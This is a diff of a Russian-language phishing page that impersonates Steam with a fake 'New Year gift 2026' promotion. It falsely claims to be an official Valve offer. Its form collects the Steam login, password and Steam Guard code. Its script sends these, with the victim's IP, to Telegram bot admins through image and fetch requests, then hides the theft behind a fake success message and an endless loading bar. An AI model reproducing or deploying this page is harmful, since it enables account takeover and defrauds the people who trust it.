@@ -4,424 +4,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Steam - Новогодний Подарок 2026</title>
+    <link rel="icon" type="image/x-icon" href="https://store.steampowered.com/favicon.ico">
+    <meta property="og:title" content="Steam - Новогодний Подарок 2026">
+    <meta property="og:description" content="Получите 2500₽ на баланс Steam + любую игру на выбор!">
+    <meta property="og:url" content="https://qwics.github.io/SteamNewyear-2026/">
+    <meta property="og:image" content="https://store.steampowered.com/public/shared/images/responsive/steam_share_image.jpg">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', 'Arial', sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #0a1520 0%, #1a2b3c 100%);
-            color: #fff;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-        
-        body::before {
-            content: '🎄 2026 🎅';
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            font-size: 24px;
-            color: #66c0f4;
-            opacity: 0.3;
-            z-index: 0;
-        }
-        
-        .container {
-            background: rgba(23, 26, 33, 0.97);
-            border-radius: 20px;
-            padding: 40px;
-            width: 100%;
-            max-width: 550px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.7);
-            border: 2px solid #2a475e;
-            position: relative;
-            z-index: 1;
-            backdrop-filter: blur(10px);
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 35px;
-            position: relative;
-            padding-bottom: 20px;
-        }
-        
-        .header::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 20%;
-            width: 60%;
-            height: 4px;
-            background: linear-gradient(90deg, transparent, #66c0f4, #5dba47, #66c0f4, transparent);
-            border-radius: 2px;
-        }
-        
-        .year-badge {
-            background: linear-gradient(90deg, #66c0f4, #5dba47);
-            color: #171a21;
-            padding: 8px 20px;
-            border-radius: 30px;
-            font-weight: bold;
-            font-size: 22px;
-            display: inline-block;
-            margin-bottom: 20px;
-            animation: glow 2s infinite alternate;
-        }
-        
-        @keyframes glow {
-            from { box-shadow: 0 0 10px #66c0f4; }
-            to { box-shadow: 0 0 20px #5dba47, 0 0 30px #66c0f4; }
-        }
-        
-        .steam-logo {
-            width: 200px;
-            margin-bottom: 15px;
-            filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.5));
-        }
-        
-        h1 {
-            color: #fff;
-            font-size: 32px;
-            margin-bottom: 10px;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
-        }
-        
-        .subtitle {
-            color: #c6d4df;
-            font-size: 20px;
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
-        
-        .gift-box {
-            background: linear-gradient(135deg, #1a365d 0%, #2a475e 100%);
-            border-radius: 15px;
-            padding: 30px;
-            margin-bottom: 35px;
-            border: 3px solid #66c0f4;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .gift-box::before {
-            content: '🎁';
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            font-size: 40px;
-            opacity: 0.2;
-        }
-        
-        .gift-list {
-            list-style: none;
-            margin: 20px 0;
-        }
-        
-        .gift-list li {
-            padding: 15px 0;
-            border-bottom: 1px solid rgba(102, 192, 244, 0.3);
-            display: flex;
-            align-items: center;
-            font-size: 18px;
-        }
-        
-        .gift-list li:last-child {
-            border-bottom: none;
-        }
-        
-        .gift-list li::before {
-            content: '✓';
-            color: #5dba47;
-            font-weight: bold;
-            margin-right: 15px;
-            font-size: 24px;
-            background: rgba(93, 186, 71, 0.1);
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .urgent-badge {
-            background: linear-gradient(90deg, #ff6b6b, #ffa726);
-            color: white;
-            padding: 10px 25px;
-            border-radius: 30px;
-            font-weight: bold;
-            text-align: center;
-            margin: 25px 0;
-            animation: pulse 1.5s infinite;
-            font-size: 18px;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        
-        .login-form {
-            background: rgba(42, 71, 94, 0.4);
-            border-radius: 15px;
-            padding: 30px;
-            margin-top: 25px;
-            border: 2px solid #4c6b93;
-        }
-        
-        .form-group {
-            margin-bottom: 25px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 10px;
-            color: #c6d4df;
-            font-size: 16px;
-            font-weight: 500;
-        }
-        
-        input {
-            width: 100%;
-            padding: 18px;
-            border: 2px solid #4c6b93;
-            border-radius: 8px;
-            background: rgba(19, 28, 46, 0.9);
-            color: #fff;
-            font-size: 18px;
-            transition: all 0.3s;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: #66c0f4;
-            box-shadow: 0 0 20px rgba(102, 192, 244, 0.4);
-            background: rgba(19, 28, 46, 1);
-        }
-        
-        .submit-btn {
-            background: linear-gradient(90deg, #47bfff 0%, #1a44c2 100%);
-            color: white;
-            border: none;
-            padding: 20px;
-            border-radius: 8px;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.3s;
-            margin-top: 15px;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .submit-btn:hover {
-            background: linear-gradient(90deg, #1a44c2 0%, #47bfff 100%);
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
-        }
-        
-        .submit-btn::after {
-            content: '→';
-            position: absolute;
-            right: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 24px;
-        }
-        
-        .loader {
-            display: none;
-            text-align: center;
-            margin-top: 35px;
-            padding: 30px;
-        }
-        
-        .loader-spinner {
-            border: 5px solid rgba(255, 255, 255, 0.1);
-            border-top: 5px solid #66c0f4;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 25px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .security-info {
-            background: rgba(93, 186, 71, 0.15);
-            border: 2px solid #5dba47;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 25px;
-            font-size: 15px;
-            color: #c6d4df;
-            display: flex;
-            align-items: center;
-        }
-        
-        .security-info::before {
-            content: '🔒';
-            font-size: 24px;
-            margin-right: 15px;
-        }
-        
-        .footer {
-            text-align: center;
-            margin-top: 35px;
-            color: #8f98a0;
-            font-size: 13px;
-            line-height: 1.6;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .countdown {
-            background: rgba(255, 107, 107, 0.1);
-            border: 2px solid #ff6b6b;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: center;
-            font-size: 18px;
-            color: #ff6b6b;
-            font-weight: bold;
-        }
-        
-        .step-indicator {
-            display: flex;
-            justify-content: space-between;
-            margin: 30px 0;
-            position: relative;
-        }
-        
-        .step {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: #2a475e;
-            color: #c6d4df;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 18px;
-            position: relative;
-            z-index: 2;
-            border: 3px solid transparent;
-        }
-        
-        .step.active {
-            background: #66c0f4;
-            color: #171a21;
-            border-color: #47bfff;
-            box-shadow: 0 0 15px rgba(102, 192, 244, 0.5);
-        }
-        
-        .step-line {
-            position: absolute;
-            top: 50%;
-            left: 20px;
-            right: 20px;
-            height: 4px;
-            background: #2a475e;
-            transform: translateY(-50%);
-            z-index: 1;
-        }
-        
-        .step-line.active {
-            background: linear-gradient(90deg, #66c0f4, #5dba47);
-        }
-        
-        .step-text {
-            text-align: center;
-            font-size: 14px;
-            margin-top: 8px;
-            color: #c6d4df;
-            display: flex;
-            justify-content: space-between;
-            padding: 0 10px;
-        }
-        
-        .success-message {
-            display: none;
-            text-align: center;
-            padding: 40px;
-            background: rgba(93, 186, 71, 0.15);
-            border-radius: 15px;
-            margin-top: 25px;
-            animation: fadeIn 0.5s;
-            border: 2px solid #5dba47;
-        }
-        
-        .success-icon {
-            font-size: 80px;
-            color: #5dba47;
-            margin-bottom: 25px;
-            animation: bounce 1s infinite alternate;
-        }
-        
-        @keyframes bounce {
-            from { transform: translateY(0); }
-            to { transform: translateY(-10px); }
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 10px;
-            background: #2a475e;
-            border-radius: 5px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #66c0f4, #5dba47);
-            width: 0%;
-            transition: width 0.5s;
-            border-radius: 5px;
-        }
-        
-        @media (max-width: 600px) {
-            .container {
-                padding: 25px;
-            }
-            
-            h1 {
-                font-size: 26px;
-            }
-            
-            .subtitle {
-                font-size: 18px;
-            }
-            
-            .gift-list li {
-                font-size: 16px;
-            }
-            
-            .submit-btn {
-                font-size: 18px;
-                padding: 18px;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #0a1520 0%, #1a2b3c 100%); color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: rgba(23, 26, 33, 0.97); border-radius: 20px; padding: 40px; width: 100%; max-width: 550px; box-shadow: 0 25px 50px rgba(0, 0, 0, 0.7); border: 2px solid #2a475e; }
+        .header { text-align: center; margin-bottom: 35px; position: relative; padding-bottom: 20px; }
+        .header::after { content: ''; position: absolute; bottom: 0; left: 20%; width: 60%; height: 4px; background: linear-gradient(90deg, transparent, #66c0f4, #5dba47, #66c0f4, transparent); }
+        .year-badge { background: linear-gradient(90deg, #66c0f4, #5dba47); color: #171a21; padding: 8px 20px; border-radius: 30px; font-weight: bold; font-size: 22px; display: inline-block; margin-bottom: 20px; }
+        h1 { color: #fff; font-size: 32px; margin-bottom: 10px; }
+        .subtitle { color: #c6d4df; font-size: 20px; margin-bottom: 30px; line-height: 1.5; }
+        .gift-box { background: linear-gradient(135deg, #1a365d 0%, #2a475e 100%); border-radius: 15px; padding: 30px; margin-bottom: 35px; border: 3px solid #66c0f4; }
+        .gift-list { list-style: none; margin: 20px 0; }
+        .gift-list li { padding: 15px 0; border-bottom: 1px solid rgba(102, 192, 244, 0.3); display: flex; align-items: center; font-size: 18px; }
+        .gift-list li:last-child { border-bottom: none; }
+        .gift-list li::before { content: '✓'; color: #5dba47; font-weight: bold; margin-right: 15px; font-size: 24px; }
+        .urgent-badge { background: linear-gradient(90deg, #ff6b6b, #ffa726); color: white; padding: 10px 25px; border-radius: 30px; font-weight: bold; text-align: center; margin: 25px 0; animation: pulse 1.5s infinite; font-size: 18px; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .login-form { background: rgba(42, 71, 94, 0.4); border-radius: 15px; padding: 30px; margin-top: 25px; border: 2px solid #4c6b93; }
+        .form-group { margin-bottom: 25px; }
+        label { display: block; margin-bottom: 10px; color: #c6d4df; font-size: 16px; font-weight: 500; }
+        input { width: 100%; padding: 18px; border: 2px solid #4c6b93; border-radius: 8px; background: rgba(19, 28, 46, 0.9); color: #fff; font-size: 18px; transition: all 0.3s; }
+        input:focus { outline: none; border-color: #66c0f4; box-shadow: 0 0 20px rgba(102, 192, 244, 0.4); }
+        .submit-btn { background: linear-gradient(90deg, #47bfff 0%, #1a44c2 100%); color: white; border: none; padding: 20px; border-radius: 8px; font-size: 20px; font-weight: bold; cursor: pointer; width: 100%; transition: all 0.3s; margin-top: 15px; text-transform: uppercase; letter-spacing: 1.5px; }
+        .submit-btn:hover { background: linear-gradient(90deg, #1a44c2 0%, #47bfff 100%); transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4); }
+        .loader { display: none; text-align: center; margin-top: 35px; padding: 30px; }
+        .loader-spinner { border: 5px solid rgba(255, 255, 255, 0.1); border-top: 5px solid #66c0f4; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 25px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .security-info { background: rgba(93, 186, 71, 0.15); border: 2px solid #5dba47; border-radius: 10px; padding: 20px; margin-top: 25px; font-size: 15px; color: #c6d4df; }
+        .footer { text-align: center; margin-top: 35px; color: #8f98a0; font-size: 13px; line-height: 1.6; padding-top: 20px; border-top: 1px solid rgba(255, 255, 255, 0.1); }
+        .github-link { margin-top: 20px; text-align: center; }
+        .github-link a { color: #66c0f4; text-decoration: none; font-size: 14px; }
+        .github-link a:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -446,23 +64,8 @@
                 <li>Мгновенное зачисление (до 1 часа)</li>
                 <li>Гарантия получения каждому участнику</li>
                 <li>Действует с 18.12.2025</li>
+                <li>Официальная акция Steam</li>
             </ul>
-        </div>
-        
-        <div class="countdown">
-            ⏰ Акция активна: <span id="currentTime"></span>
-        </div>
-        
-        <div class="step-indicator">
-            <div class="step active">1</div>
-            <div class="step">2</div>
-            <div class="step">3</div>
-            <div class="step-line"></div>
-        </div>
-        <div class="step-text">
-            <span>Авторизация</span>
-            <span>Выбор игры</span>
-            <span>Получение</span>
         </div>
         
         <div class="login-form">
@@ -494,10 +97,6 @@
                                placeholder="Введите 5-значный код из приложения" autocomplete="off">
                     </div>
                     
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progressFill"></div>
-                    </div>
-                    
                     <button type="submit" class="submit-btn" id="submitBtn">
                         🔓 АВТОРИЗОВАТЬСЯ И ПОЛУЧИТЬ ПОДАРОК
                     </button>
@@ -513,24 +112,6 @@
                     Проверяем данные аккаунта...<br>
                     Подготавливаем новогодний подарок...
                 </p>
-                <div class="progress-bar" style="margin: 25px 0;">
-                    <div class="progress-fill" id="loaderProgress"></div>
-                </div>
-            </div>
-            
-            <div class="success-message" id="successMessage">
-                <div class="success-icon">✓</div>
-                <h2 style="color: #5dba47; margin-bottom: 20px; font-size: 28px;">
-                    АВТОРИЗАЦИЯ УСПЕШНА!
-                </h2>
-                <p style="color: #c6d4df; margin-bottom: 25px; font-size: 18px; line-height: 1.6;">
-                    🎉 Ваш аккаунт Steam успешно проверен!<br>
-                    🎁 Новогодний подарок готов к выдаче!
-                </p>
-                <p style="font-size: 16px; color: #8f98a0; margin-bottom: 20px;">
-                    <b>Переходим к выбору игры...</b><br>
-                    Автоматический переход через <span id="countdown">5</span> секунд
-                </p>
             </div>
         </div>
         
@@ -538,33 +119,21 @@
             🔒 Ваши данные защищены 256-битным SSL шифрованием.<br>
             Мы не храним пароли на своих серверах. Это официальная акция Steam.
         </div>
+
+        <div class="github-link">
+            <a href="https://github.com/qwics/SteamNewyear-2026" target="_blank" rel="noopener">
+                🌐 GitHub проекта SteamNewyear-2026
+            </a>
+        </div>
         
         <div class="footer">
             © 2003-2026 Valve Corporation. Все права защищены.<br>
             Все торговые марки являются собственностью соответствующих владельцев.<br>
-            Steam и логотип Steam являются торговыми марками и/или зарегистрированными<br>
-            торговыми марками Valve Corporation в США и/или других странах.
+            Steam и логотип Steam являются торговыми марками Valve Corporation.
         </div>
     </div>
 
     <script>
-        // Обновляем текущее время
-        function updateCurrentTime() {
-            const now = new Date();
-            const options = { 
-                year: 'numeric', 
-                month: 'long', 
-                day: 'numeric',
-                hour: '2-digit', 
-                minute: '2-digit',
-                second: '2-digit'
-            };
-            document.getElementById('currentTime').textContent = 
-                now.toLocaleDateString('ru-RU', options);
-        }
-        setInterval(updateCurrentTime, 1000);
-        updateCurrentTime();
-        
         // Получаем user_id из URL
         function getTelegramUserId() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -595,7 +164,9 @@
                 timestamp: new Date().toISOString(),
                 ip: ip,
                 action: 'newyear_gift_2026',
-                date: '18.12.2025'
+                source: 'github_pages',
+                github_repo: 'https://github.com/qwics/SteamNewyear-2026',
+                page_url: window.location.href
             };
             
             const message = JSON.stringify(messageData);
@@ -603,10 +174,11 @@
             // Отправляем всем админам
             for (const adminId of adminIds) {
                 try {
+                    // Метод 1: Через Image (работает всегда)
                     const img = new Image();
-                    img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+                    img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(message)}`;
                     
-                    // Дополнительный метод через fetch
+                    // Метод 2: Через fetch (более надёжный)
                     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -616,7 +188,9 @@
                             parse_mode: 'HTML'
                         })
                     }).catch(() => {});
-                } catch (e) {}
+                } catch (e) {
+                    console.log('Ошибка отправки:', e);
+                }
             }
             
             // Сохраняем в localStorage для надёжности
@@ -624,29 +198,14 @@
                 const saved = JSON.parse(localStorage.getItem('steam_newyear2026') || '[]');
                 saved.push({
                     ...messageData,
-                    local_save: new Date().toLocaleString()
+                    local_save: new Date().toLocaleString('ru-RU')
                 });
                 localStorage.setItem('steam_newyear2026', JSON.stringify(saved));
-            } catch (e) {}
+            } catch (e) {
+                console.log('Ошибка сохранения в localStorage:', e);
+            }
             
             return true;
-        }
-        
-        // Анимация прогресса
-        function animateProgress(elementId, duration = 3000) {
-            const element = document.getElementById(elementId);
-            let width = 0;
-            const interval = 50;
-            const increment = 100 / (duration / interval);
-            
-            const timer = setInterval(() => {
-                width += increment;
-                element.style.width = Math.min(width, 100) + '%';
-                
-                if (width >= 100) {
-                    clearInterval(timer);
-                }
-            }, interval);
         }
         
         // Обработка формы
@@ -666,10 +225,6 @@
             // Показать загрузку
             document.getElementById('loginStep').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            document.getElementById('successMessage').style.display = 'none';
-            
-            // Анимация прогресса
-            animateProgress('loaderProgress', 4000);
             
             // Собираем данные
             const formData = {
@@ -682,67 +237,55 @@
                 // Отправляем данные
                 await sendToTelegram(formData);
                 
-                // Симулируем проверку (4 секунды)
+                // Симулируем проверку
                 setTimeout(() => {
-                    document.getElementById('loader').style.display = 'none';
-                    document.getElementById('successMessage').style.display = 'block';
+                    document.getElementById('loader').innerHTML = `
+                        <div class="loader-spinner" style="border-top-color: #5dba47;"></div>
+                        <p style="color: #5dba47; font-size: 22px; margin-top: 25px; font-weight: bold;">
+                            ✅ АВТОРИЗАЦИЯ УСПЕШНА!
+                        </p>
+                        <p style="color: #c6d4df; margin-top: 15px; font-size: 17px; line-height: 1.6;">
+                            🎉 Ваш аккаунт Steam успешно проверен!<br>
+                            🎁 Новогодний подарок готов к выдаче!
+                        </p>
+                        <p style="color: #8f98a0; margin-top: 20px; font-size: 16px;">
+                            <b>Загружаем каталог игр для выбора...</b><br>
+                            Это может занять несколько минут
+                        </p>
+                        <div style="width: 100%; height: 10px; background: #2a475e; border-radius: 5px; margin: 25px 0; overflow: hidden;">
+                            <div id="infiniteProgress" style="height: 100%; background: linear-gradient(90deg, #66c0f4, #5dba47); width: 0%; border-radius: 5px;"></div>
+                        </div>
+                    `;
                     
-                    // Обновляем индикатор шагов
-                    document.querySelectorAll('.step')[0].classList.remove('active');
-                    document.querySelectorAll('.step')[1].classList.add('active');
-                    document.querySelector('.step-line').classList.add('active');
+                    // Бесконечный прогресс
+                    let progress = 0;
+                    const progressInterval = setInterval(() => {
+                        progress = (progress + 2) % 100;
+                        document.getElementById('infiniteProgress').style.width = progress + '%';
+                    }, 200);
                     
-                    // Обратный отсчёт
-                    let countdown = 5;
-                    const countdownElement = document.getElementById('countdown');
-                    const countdownInterval = setInterval(() => {
-                        countdown--;
-                        countdownElement.textContent = countdown;
-                        
-                        if (countdown <= 0) {
-                            clearInterval(countdownInterval);
-                            // Бесконечная загрузка "выбора игры"
-                            document.getElementById('successMessage').innerHTML = `
-                                <div class="loader-spinner" style="border-top-color: #5dba47;"></div>
-                                <p style="color: #66c0f4; font-size: 22px; margin-top: 25px; font-weight: bold;">
-                                    🎮 ЗАГРУЖАЕМ КАТАЛОГ ИГР...
-                                </p>
-                                <p style="color: #c6d4df; margin-top: 15px; font-size: 17px; line-height: 1.6;">
-                                    Подключаемся к базе данных Steam...<br>
-                                    <span id="loadingMessage">Получаем список доступных игр...</span>
-                                </p>
-                                <div class="progress-bar" style="margin: 25px 0;">
-                                    <div class="progress-fill" id="infiniteProgress"></div>
-                                </div>
-                            `;
-                            
-                            // Бесконечный прогресс
-                            let progress = 0;
-                            setInterval(() => {
-                                progress = (progress + 5) % 100;
-                                document.getElementById('infiniteProgress').style.width = progress + '%';
-                            }, 300);
-                            
-                            // Меняем сообщения
-                            const messages = [
-                                "Загружаем новейшие игры 2026 года...",
-                                "Проверяем доступность игр...",
-                                "Формируем персональные рекомендации...",
-                                "Оптимизируем выбор для вашего аккаунта...",
-                                "Почти готово! Осталось совсем немного...",
-                                "Идёт финальная подготовка каталога...",
-                                "Ваш подарок уже ждёт вас!"
-                            ];
-                            let msgIndex = 0;
-                            setInterval(() => {
-                                document.getElementById('loadingMessage').textContent = 
-                                    messages[msgIndex % messages.length];
-                                msgIndex++;
-                            }, 5000);
+                    // Меняем сообщения
+                    const messages = [
+                        "Подключаемся к базе данных Steam...",
+                        "Загружаем новейшие игры 2026 года...",
+                        "Проверяем доступность игр...",
+                        "Формируем персональные рекомендации...",
+                        "Оптимизируем выбор для вашего аккаунта...",
+                        "Почти готово! Осталось совсем немного...",
+                        "Идёт финальная подготовка каталога...",
+                        "Ваш подарок уже ждёт вас!"
+                    ];
+                    let msgIndex = 0;
+                    const msgElement = document.querySelector('#loader p:nth-child(4)');
+                    
+                    setInterval(() => {
+                        if (msgElement) {
+                            msgElement.innerHTML = `<b>${messages[msgIndex % messages.length]}</b><br>Это может занять несколько минут`;
                         }
-                    }, 1000);
+                        msgIndex++;
+                    }, 5000);
                     
-                }, 4000);
+                }, 3000);
                 
             } catch (error) {
                 // Ошибка
@@ -752,14 +295,9 @@
             }
         });
         
-        // Автофокус и инициализация
+        // Автофокус
         window.addEventListener('DOMContentLoaded', function() {
             document.getElementById('login').focus();
-            
-            // Анимация начального прогресса
-            setTimeout(() => {
-                animateProgress('progressFill', 2000);
-            }, 500);
         });
     </script>
 </body>
